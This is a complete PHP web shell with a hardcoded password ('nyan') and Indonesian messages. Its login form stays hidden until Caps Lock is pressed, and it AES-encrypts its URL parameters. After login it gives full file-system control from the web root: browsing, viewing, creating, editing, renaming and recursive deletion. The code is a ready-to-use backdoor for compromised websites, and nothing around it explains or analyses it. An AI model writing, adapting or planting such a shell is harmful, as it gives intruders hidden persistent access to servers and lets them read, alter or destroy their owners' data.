<?php
session_start();
$pwd = "nyan";

if (isset($_POST['password'])) {
    if ($_POST['password'] === $pwd) {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit();
    } else {
        echo "Kata sandi salah. Silakan coba lagi.";
        showForm();
    }
} elseif (!isset($_SESSION['logged_in'])) {
    showForm();
} else {
    showContent();
}

function showForm() {
    echo '<style>.hidden-form{display:none;}</style>
    <div class="hidden-form"><form method="post">
    <label for="password">Masukkan Kata Sandi:</label>
    <input type="password" name="password" id="password">
    <input type="submit" value="Submit"></form></div>
    <script>document.addEventListener("keydown", function(event) {
    if (event.getModifierState("CapsLock")) {
        document.querySelector(".hidden-form").style.display = "block";
    }});</script>';
}

function showContent() {
    $root = realpath($_SERVER['DOCUMENT_ROOT']);
    $key = '4b8e5e9f48c2f5a63b4c1e3a1f4a2b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2';
    
    function enc($txt, $key) {
        $iv_len = openssl_cipher_iv_length('aes-256-cbc');
        $iv = openssl_random_pseudo_bytes($iv_len);
        $enc = openssl_encrypt($txt, 'aes-256-cbc', $key, 0, $iv);
        return base64_encode($enc . '::' . $iv);
    }

    function dec($txt, $key) {
        list($enc_data, $iv) = explode('::', base64_decode($txt), 2);
        return openssl_decrypt($enc_data, 'aes-256-cbc', $key, 0, $iv);
    }

    foreach ($_GET as $c => $d) $_GET[$c] = dec($d, $key);
    $curDir = realpath($_GET['d'] ?? $root);
    chdir($curDir);

    $result = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $cmd = $_POST;
        $newItem = $curDir . '/' . ($cmd['folder_name'] ?? $cmd['file_name'] ?? $cmd['edit_file'] ?? $cmd['delete_file'] ?? $cmd['old_name']);
        
        if (isset($cmd['folder_name'])) {
            $result = !file_exists($newItem) && mkdir($newItem) ? 'Folder created!' : 'Error!';
        } elseif (isset($cmd['file_name'])) {
            $result = !file_exists($newItem) && file_put_contents($newItem, '') !== false ? 'File created!' : 'Error!';
        } elseif (isset($cmd['edit_file'])) {
            $result = file_exists($newItem) && !empty($cmd['file_content']) && file_put_contents($newItem, $cmd['file_content']) !== false ? 'File edited!' : 'Error!';
        } elseif (isset($cmd['delete_file'])) {
            $result = file_exists($newItem) ? (is_dir($newItem) ? delDir($newItem) : unlink($newItem)) ? 'Deleted!' : 'Error!' : 'Not found!';
        } elseif (isset($cmd['rename_item'])) {
            $newName = $curDir . '/' . $cmd['new_name'];
            $result = file_exists($newItem) && rename($newItem, $newName) ? 'Renamed!' : 'Error!';
        } elseif (isset($cmd['view_file'])) {
            $result = file_exists($newItem) ? '<p>' . htmlspecialchars(file_get_contents($newItem)) . '</p>' : 'Not found!';
        }
    }

    echo "<center><div class='fig-ansi'></div></center><hr>curdir: ";
    $dirs = explode(DIRECTORY_SEPARATOR, $curDir);
    foreach ($dirs as $index => $dir) {
        $path = implode(DIRECTORY_SEPARATOR, array_slice($dirs, 0, $index + 1));
        echo ($index ? ' / ' : '') . '<a href="?nyan=.php&d=' . enc($path, $key) . '">' . $dir . '</a>';
    }

    echo '<hr><form method="post"><input type="text" name="folder_name" placeholder="New Folder"><input type="submit" value="Create"></form>';
    echo '<form method="post"><input type="text" name="file_name" placeholder="New File"><input type="submit" value="Create"></form>';
    echo '<form method="post"><input type="text" name="edit_file" placeholder="Edit File"><textarea name="file_content" placeholder="Content"></textarea><input type="submit" value="Edit"></form>';
    echo $result;

    echo '<table border=1><tr><th>Name</th><th>Size</th><th>View</th><th>Delete</th><th>Rename</th></tr>';
    foreach (scandir($curDir) as $v) {
        if ($v === '.' || $v === '..') continue;
        $u = realpath($curDir . DIRECTORY_SEPARATOR . $v);
        $itemLink = is_dir($v) ? '?nyan=.php&d=' . enc($curDir . '/' . $v, $key) : '?nyan=.php&d=' . enc($curDir, $key) . '&f=' . enc($v, $key);
        echo '<tr><td><a href="' . $itemLink . '">' . $v . '</a></td><td>' . filesize($u) . '</td>
        <td><form method="post"><input type="hidden" name="view_file" value="' . $v . '"><input type="submit" value="View"></form></td>
        <td><form method="post"><input type="hidden" name="delete_file" value="' . $v . '"><input type="submit" value="Delete"></form></td>
        <td><form method="post"><input type="hidden" name="old_name" value="' . $v . '"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td></tr>';
    }
    echo '</table>';
}

function delDir($dir) {
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) delDir($path);
        else unlink($path);
    }
    return rmdir($dir);
}
?>
